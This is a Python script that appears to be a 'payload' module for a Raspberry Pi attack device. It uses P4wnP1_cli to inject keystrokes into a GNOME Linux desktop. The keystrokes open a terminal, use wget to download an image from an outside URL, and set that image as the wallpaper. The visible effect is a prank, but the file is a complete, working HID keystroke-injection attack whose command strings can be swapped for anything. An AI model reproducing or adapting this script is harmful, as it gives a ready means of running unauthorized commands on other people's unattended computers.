#!/usr/bin/env python3
"""
RaspyJack *payload* – **HID Attack: Change Wallpaper (Linux)**
===============================================================
A social engineering HID attack that downloads an image and sets it as
the desktop wallpaper on a GNOME-based Linux desktop.
"""

import os, sys, subprocess, time
sys.path.append(os.path.abspath(os.path.join(__file__, '..', '..')))
import RPi.GPIO as GPIO
import LCD_1in44, LCD_Config
from PIL import Image, ImageDraw, ImageFont

# --- CONFIGURATION ---
IMAGE_URL = "https://i.imgur.com/w4n2y5V.jpeg" # A picture of a cat
IMAGE_PATH = "/tmp/wallpaper.jpg"

# --- Display Functions ---
def show_message(lines, color="lime"):
    LCD = LCD_1in44.LCD()
    LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
    image = Image.new("RGB", (128, 128), "BLACK")
    draw = ImageDraw.Draw(image)
    font = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 12)
    y = 40
    for line in lines:
        draw.text((10, y), line, font=font, fill=color)
        y += 15
    LCD.LCD_ShowImage(image, 0, 0)

# --- Main Attack Logic ---
def run_attack():
    show_message(["HID Attack:", "Linux Wallpaper"])
    
    if subprocess.run("which P4wnP1_cli", shell=True, capture_output=True).returncode != 0:
        show_message(["ERROR:", "P4wnP1_cli", "not found!"])
        return

    cmd1 = f"wget -O {IMAGE_PATH} {IMAGE_URL}"
    cmd2 = f"gsettings set org.gnome.desktop.background picture-uri file://{IMAGE_PATH}"
    
    script = f"""
CTRL-ALT t
delay(750)
type("{cmd1}")
press("ENTER")
delay(3000)
type("{cmd2}")
press("ENTER")
delay(500)
type("exit")
press("ENTER")
"""
    
    cli_command = f"P4wnP1_cli hid job -c '{script}'"
    
    try:
        subprocess.run(cli_command, shell=True, check=True, timeout=30)
        show_message(["Attack Sent!"])
    except Exception as e:
        show_message(["Attack FAILED!"])
        print(f"Error running HID attack: {e}", file=sys.stderr)

# --- Execution ---
if __name__ == '__main__':
    try:
        run_attack()
        time.sleep(3)
    finally:
        LCD = LCD_1in44.LCD()
        LCD.LCD_Clear()
        GPIO.cleanup()
        print("HID Attack payload finished.")
